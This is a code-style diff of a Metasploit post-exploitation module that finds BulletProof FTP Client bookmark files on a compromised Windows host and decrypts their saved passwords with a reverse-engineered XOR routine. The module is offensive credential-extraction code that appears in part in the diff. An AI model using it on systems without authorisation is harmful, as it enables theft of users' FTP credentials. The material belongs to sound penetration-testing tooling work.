@@ -3,25 +3,27 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Post
   include Msf::Auxiliary::Report
   include Msf::Post::File
   include Msf::Post::Windows::UserProfiles
   include Msf::Post::Windows::Registry
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'          => 'Windows Gather BulletProof FTP Client Saved Password Extraction',
-      'Description'   => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather BulletProof FTP Client Saved Password Extraction',
+        'Description' => %q{
           This module extracts information from BulletProof FTP Bookmarks files and store
-        retrieved credentials in the database.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'juan vazquez'],
-      'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+          retrieved credentials in the database.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'juan vazquez'],
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ]
+      )
+    )
   end
 
   class BookmarksParser
@@ -62,12 +64,12 @@ class MetasploitModule < Msf::Post
 
     def generate_xor_key
       # Magic numbers 0x100 and 0x8088405 is obtained from bpftpclient.exe static analysis:
-      #.text:007B13C1                 mov     eax, 100h
+      # .text:007B13C1                 mov     eax, 100h
       # ... later
-      #.text:0040381F                 imul    edx, dword_7EF008[ebx], 8088405h
-      #.text:00403829                 inc     edx
-      #.text:0040382A                 mov     dword_7EF008[ebx], edx
-      #.text:00403830                 mul     edx
+      # .text:0040381F                 imul    edx, dword_7EF008[ebx], 8088405h
+      # .text:00403829                 inc     edx
+      # .text:0040382A                 mov     dword_7EF008[ebx], edx
+      # .text:00403830                 mul     edx
       temp = @xor_key * 0x8088405
       temp = low_dword(temp)
       temp = temp + 1
@@ -81,9 +83,11 @@ class MetasploitModule < Msf::Post
     def decrypt(encrypted)
       length = encrypted.unpack("C")[0]
       return "" if length.nil?
+
       @xor_key = length
       encrypted = encrypted[1..length]
       return "" if encrypted.length != length
+
       decrypted = ""
       encrypted.unpack("C*").each { |byte|
         key = generate_xor_key
@@ -93,9 +97,9 @@ class MetasploitModule < Msf::Post
     end
 
     def parse_object
-      object_length = @contents_bookmark[0,1].unpack("C")[0]
-      object = @contents_bookmark[0, object_length + 1 ]
-      @contents_bookmark.slice!(0, object_length+1)
+      object_length = @contents_bookmark[0, 1].unpack("C")[0]
+      object = @contents_bookmark[0, object_length + 1]
+      @contents_bookmark.slice!(0, object_length + 1)
       content = decrypt(object)
       return content
     end
@@ -148,7 +152,6 @@ class MetasploitModule < Msf::Post
   end
 
   def get_bookmarks(path)
-
     bookmarks = []
 
     if not directory?(path)
@@ -170,15 +173,14 @@ class MetasploitModule < Msf::Post
     session.fs.dir.foreach(user_dir) do |directory|
       if directory =~ /BulletProof Software/
         vprint_status("BulletProof Data Directory found at #{user_dir}\\#{directory}")
-        return "#{user_dir}\\#{directory}"#"\\BulletProof FTP Client\\2010\\sites\\Bookmarks"
+        return "#{user_dir}\\#{directory}" # "\\BulletProof FTP Client\\2010\\sites\\Bookmarks"
       end
     end
     return nil
   end
 
   def report_findings(entries)
-
-    entries.each{ |entry|
+    entries.each { |entry|
       @credentials << [
         entry[:site_name],
         entry[:site_address],
@@ -219,7 +221,6 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-
     print_status("Checking if BulletProof FTP Client is installed...")
     if not check_installation
       print_error("BulletProof FTP Client isn't installed")
@@ -232,6 +233,7 @@ class MetasploitModule < Msf::Post
     bullet_paths = []
     profiles.each do |user|
       next if user['LocalAppData'] == nil
+
       bulletproof_dir = check_bulletproof(user['LocalAppData'])
       bullet_paths << bulletproof_dir if bulletproof_dir
     end
@@ -287,9 +289,9 @@ class MetasploitModule < Msf::Post
 
     # Report / Show findings
     @credentials = Rex::Text::Table.new(
-      'Header'    => "BulletProof FTP Client Bookmarks",
-      'Indent'    => 1,
-      'Columns'   =>
+      'Header' => "BulletProof FTP Client Bookmarks",
+      'Indent' => 1,
+      'Columns' =>
         [
           "Site Name",
           "Site Address",
@@ -298,7 +300,8 @@ class MetasploitModule < Msf::Post
           "Password",
           "Remote Dir",
           "Local Dir"
-        ])
+        ]
+    )
 
     report_findings(entries)
     results = @credentials.to_s
@@ -316,6 +319,5 @@ class MetasploitModule < Msf::Post
       )
       print_status("Data stored in: #{p.to_s}")
     end
-
   end
 end
